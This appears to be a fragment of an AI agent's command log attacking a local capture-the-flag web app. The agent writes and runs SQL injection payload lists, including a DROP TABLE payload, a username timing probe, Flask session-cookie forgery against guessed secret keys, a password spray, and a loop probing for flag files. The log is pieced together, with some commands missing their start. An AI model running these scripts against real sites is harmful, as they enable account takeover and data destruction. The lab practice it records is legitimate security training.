import requests

url = "http://localhost:5003/login"

# Test various SQL injection payloads
payloads = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR 1=1#",
    "') OR ('1'='1",
    "') OR 1=1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "1' AND '1'='1",
    "1 AND 1=1",
    "' AND 1=1 AND '1'='1",
    "admin' AND '1'='1",
    "'; DROP TABLE users--",
    "\\",
    "'\"",
]

for payload in payloads:
    try:
        # Test in username
        r = requests.post(url, data={"username": payload, "password": "test"})
        if "Invalid credentials" not in r.text:
            print(f"[USERNAME] Interesting response for: {payload}")
            print(f"  Response: {r.text[:200]}")
        
        # Test in password
        r = requests.post(url, data={"username": "admin", "password": payload})
        if "Invalid credentials" not in r.text:
            print(f"[PASSWORD] Interesting response for: {payload}")
            print(f"  Response: {r.text[:200]}")
    except Exception as e:
        print(f"Error with payload {payload}: {e}")

print("Done testing SQL injection payloads")
EOF

args.command:
cat > /home/smartdatayb/claudecode-ctf/timing_test.py << 'EOF'
import requests
import time

url = "http://localhost:5003/login"

# Test timing for different usernames
usernames = ["admin", "user", "test", "guest", "root", "administrator", "nonexistent123456"]

for username in usernames:
    times = []
    for _ in range(3):
        start = time.time()
        r = requests.post(url, data={"username": username, "password": "wrongpassword"})
        elapsed = time.time() - start
        times.append(elapsed)
    avg_time = sum(times) / len(times)
    print(f"{username}: avg={avg_time:.4f}s")
EOF

Flask Unsign is a penetration testing utility that attempts to uncover a Flask
server's secret key by taking a signed session verifying it against a wordlist
of commonly used and publicly known secret keys (sourced from books, GitHub,
StackOverflow and various other sources). To begin, use one of the following
arguments: --unsign, --sign, --decode

options:
  -h, --help
       Show this help message and exit

  -d, --decode
       Only decode the sessions's contents and write them to stdout.

  -u, --unsign
       Attempts to crack the session's signature by iterating over a given
       wordlist with commonly used .

  -s, --sign
       Sign a session with a specified secret key, often used for session
       manipulation. Requires the '--secret' argument.

  -l, --legacy
       Generate / verify signatures using itsdangerous'es legacy timestamp
       generator. Note: All installations of flask before 2018-10-18 use this
       form of timestamp and all generated signatures will be regarded as
       expired (meaning you will not be able to brute-force the secret key nor
       forge any sessions).

  -c [COOKIE], --cookie [COOKIE]
       Session cookie string. If you're decoding/cracking a session key
       thiscan be obtained by manually inspecting an HTTP request and
       extracting the value of the "session" cookie. If you're signing a
       cookie, this can be any arbitrary Python dictionary with data (or other
       data type, whatever floats your boat, but don't expect the server to
       understand it). If no argument is provided, the program will attempt to
       read from stdin. Note: When signing data, this will ALWAYS be
       evaluated.

  --secret SECRET, -S SECRET
       Secret key to sign a new session cookie with. Generally obtained by
       brute-forcing a known session using "--unsign". Note: this argument is
       affected by the "--no-literal-eval" argument.

  --salt SALT
       Custom salt string, this will not be changed in most instances of
       Flask. But hey, if you need to change it, you can! Note: this argument
       is affected by the "--no-literal-eval" argument.

  --wordlist WORDLIST, -w WORDLIST
       Note: this argument is affected by the "--no-literal-eval" argument.

  --threads THREADS, -t THREADS
       Specifies the number of threads to brute-force the secret key with.
       Defaults to: 8

  --no-literal-eval, -nE
       Due to the fact that a lot of secret keys are binary strings, all lines
       in wordlists are encapsulated with double/single quotes to represent
       Python strings. This is done so it's easier to generate wordlists
       without having to store the data in an arbitrary binary format (or SQL
       databases). By enabling this option, you'll be able to use a wordlist /
       secret keys / salts without having to wrap each line with quotes.

  --server SERVER
       Specifies a remote HTTP(S) server to fetch the session cookie from. In
       order for this to work, you'll have to specify an url which returns a
       "Set-Cookie" header.

  --insecure, -i, -k
       By default, all SSL connections are verified to be secure to prevent
       man-in-the-middle attacks. This option disables TLS/SSL certificate
       verification entirely.

  -o OUTPUT, --output OUTPUT
       Writes all stdout to the specified file.

  -p PROXY, --proxy PROXY
       Specifies an HTTP(S) proxy to connect to before firing the request.
       Useful for making requests for a service behind a firewall.

  --cookie-name COOKIE_NAME
       Specifies the cookie name which contains the session information. In
       default Flask applications this defaults to 'session', however it is
       possible to change this. Only use in combination with the "--server"
       argument.

  -U USER_AGENT, --user-agent USER_AGENT
       Specifies a custom user agent to use when making requests to the
       server. Only use in combination with the "--server" argument. Defaults
       to: 'Flask-Unsign/1.2.1'

  -q, --quiet, --stfu
       Disables verbose output logging, and only logs usable output. Note: All
       "usable" output is logged to stdout, wheras all informative output is
       logged to stderr, so you could extract all usable output by redirecting
       it with > in bash.

  -C CHUNK_SIZE, --chunk-size CHUNK_SIZE
       Number of passwords loaded into memory per thread cycle. After each
       password of the chunk has been depleted a status update will be printed
       to the console with the attempted password. Default: 128

  -v, --version
       Prints the current version number to stdout and exits.

args.command:
cat > /home/smartdatayb/claudecode-ctf/forge_session.py << 'EOF'
import subprocess
import requests

common_secrets = [
    "secret",
    "secret_key",
    "secretkey", 
    "password",
    "admin",
    "flask",
    "development",
    "dev",
    "test",
    "testing",
    "key",
    "supersecret",
    "mysecret",
    "changeme",
    "123456",
    "default",
    "1234567890",
    "abcdefghijklmnop",
    "SECRET_KEY",
    "super_secret_key",
    "my_secret_key",
    "flask_secret",
    "app_secret",
    "debug",
]

session_data = '{"logged_in": true, "username": "admin"}'

for secret in common_secrets:
    try:
        result = subprocess.run(
            ["/home/smartdatayb/claudecode-ctf/venv/bin/python", "-m", "flask_unsign", 
             "--sign", "--cookie", session_data, "--secret", secret],
            capture_output=True, text=True
        )
        cookie = result.stdout.strip()
        
        # Try the cookie
        r = requests.get("http://localhost:5003/profile", 
                         cookies={"session": cookie}, 
                         allow_redirects=False)
        
        if r.status_code != 302:  # Not redirected to login
            print(f"[!] Secret found: {secret}")
            print(f"[!] Cookie: {cookie}")
            print(f"[!] Response: {r.text[:500]}")
            break
    except Exception as e:
        print(f"Error with {secret}: {e}")

print("Done testing secrets")
EOF
/home/smartdatayb/claudecode-ctf/venv/bin/python /home/smartdatayb/claudecode-ctf/forge_session.py
args.description: Test common secret keys for Flask session forgery

args.command:
cat > /home/smartdatayb/claudecode-ctf/forge_session2.py << 'EOF'
import subprocess
import requests

common_secrets = [
    "secret",
    "super secret key",
    "this is a secret",
    "insecure",
    "s3cr3t",
    "sk_test",
    "hunter2",
    "FLAG",
    "flag",
    "CTF",
    "ctf",
]

# Try different session data structures
session_payloads = [
    '{"logged_in": true}',
    '{"username": "admin"}',
    '{"user": "admin"}',
    '{"admin": true}',
    '{"authenticated": true}',
    '{"user_id": 1}',
    '{"is_admin": true}',
]

for payload in session_payloads:
    for secret in common_secrets:
        try:
            result = subprocess.run(
                ["/home/smartdatayb/claudecode-ctf/venv/bin/python", "-m", "flask_unsign", 
                 "--sign", "--cookie", payload, "--secret", secret],
                capture_output=True, text=True
            )
            cookie = result.stdout.strip()
            
            # Try the cookie
            r = requests.get("http://localhost:5003/profile", 
                             cookies={"session": cookie}, 
                             allow_redirects=False)
            
            if r.status_code != 302:  # Not redirected to login
                print(f"[!] Secret found: {secret}")
                print(f"[!] Payload: {payload}")
                print(f"[!] Cookie: {cookie}")
                print(f"[!] Response: {r.text[:500]}")
                exit(0)
        except Exception as e:
            pass

print("Done testing")
EOF

import requests

url = "http://localhost:5003/login"

usernames = ["admin", "user", "test", "guest", "root", "administrator", "demo"]
passwords = [
    "admin", "password", "123456", "admin123", "password123", 
    "letmein", "welcome", "monkey", "dragon", "master",
    "qwerty", "login", "passw0rd", "abc123", "111111",
    "admin@123", "test", "test123", "guest", "root",
    "administrator", "P@ssw0rd", "secret", "changeme", "default",
    "demo", "1234", "12345", "1234567890"
]

for username in usernames:
    for password in passwords:
        r = requests.post(url, data={"username": username, "password": password})
        if "Invalid credentials" not in r.text:
            print(f"[!] Found: {username}:{password}")
            print(f"[!] Response: {r.text[:200]}")

print("Password spray complete")
EOF

args.command:
cat > /home/smartdatayb/claudecode-ctf/sqli_advanced.py << 'EOF'
import requests

url = "http://localhost:5003/login"

# More advanced SQLi payloads including SQLite-specific
payloads = [
    # Basic SQLite
    "' OR 1=1--",
    "' OR 1=1;--",
    "' OR 1--",
    "' OR ''='",
    "' OR true--",
    "admin'--",
    "admin' --",
    "admin'#",
    "admin' #",
    
    # Double hyphen variations
    "' OR 1=1 -- ",
    "'OR 1=1--",
    "' OR 1=1 --",
    
    # UNION-based
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT 'admin','pass'--",
    "' UNION SELECT null,null--",
    "' UNION ALL SELECT 1--",
    
    # Bypass with encoding
    "%27%20OR%201=1--",
    "'%20OR%201=1--",
    
    # SQLite specific
    "' OR length(sqlite_version())>0--",
    "' OR sqlite_version()--",
    
    # Comment variations
    "' OR 1=1/*",
    "' OR 1=1;/*",
    "admin'/**/--",
    
    # Stacked queries
    "'; SELECT 1--",
    "'; SELECT * FROM users--",
    
    # Boolean-based blind
    "' AND 1=1--",
    "' AND 1=2--",
    
    # Backtick variations (MySQL)
    "admin`--",
    "' OR `1`=`1`--",
    
    # Empty string
    "''",
    "' '",
]

for payload in payloads:
    # Test in username
    r = requests.post(url, data={"username": payload, "password": "x"})
    if "Invalid credentials" not in r.text and r.status_code != 401:
        print(f"[USER] {payload}: {r.status_code} - {r.text[:100]}")
    
    # Test in password
    r = requests.post(url, data={"username": "admin", "password": payload})
    if "Invalid credentials" not in r.text and r.status_code != 401:
        print(f"[PASS] {payload}: {r.status_code} - {r.text[:100]}")

print("SQLi test complete")
EOF
/home/smartdatayb/claudecode-ctf/venv/bin/python /home/smartdatayb/claudecode-ctf/sqli_advanced.py

for path in static/flag.txt static/flag static/secret debug/flag .flag flag.txt secret.txt admin/flag internal/flag api/flag data/flag files/flag download/flag; do 
  echo -n "$path: "
  resp=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:5003/$path)
  echo $resp
  if [ "$resp" != "404" ]; then
    echo "  Content: $(curl -s http://localhost:5003/$path | head -c 200)"
  fi
done
